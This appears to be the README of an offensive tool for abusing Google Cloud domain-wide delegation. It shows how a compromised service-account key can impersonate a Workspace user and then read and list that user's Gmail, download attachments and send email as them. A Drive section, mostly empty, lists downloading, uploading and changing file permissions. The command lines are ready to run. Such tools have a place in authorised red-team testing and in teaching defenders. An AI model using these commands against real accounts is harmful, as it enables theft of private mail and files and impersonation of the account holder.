# Delegate
Tool to perform GCP Domain Wide Delegation abuse and access Gmail and Drive data from a compromised Service Account with domain wide delegation permissions configured within Google Workspace.

<img src="./DomainWideDelegation_GCP.png" alt="gcpdelegation" width="800"/>

## Delegate tool usage
#### Gmail usage
List all Gmail emails (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a list
```

Read Gmail emails (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read
```

List Gmail folders (Labels)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a folders
```

Download all attachments within the targeted Gmail (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a attachments
```

Read all emails within specified folder (Labels) (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read -f DRAFT
```

Send an email as targeted.delegated@mackinsoncloud.com to jdoe@gmail.com specifying subject and body email content
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a send -r jdoe@gmail.com -s "Test Messaage subject" -c "Hello this is a test email"
```

#### Drive usage

List all files and folders within the targeted Drive account
```

```

Download locally files/folders
- Upload files/folders
- Modify permissions on file/folder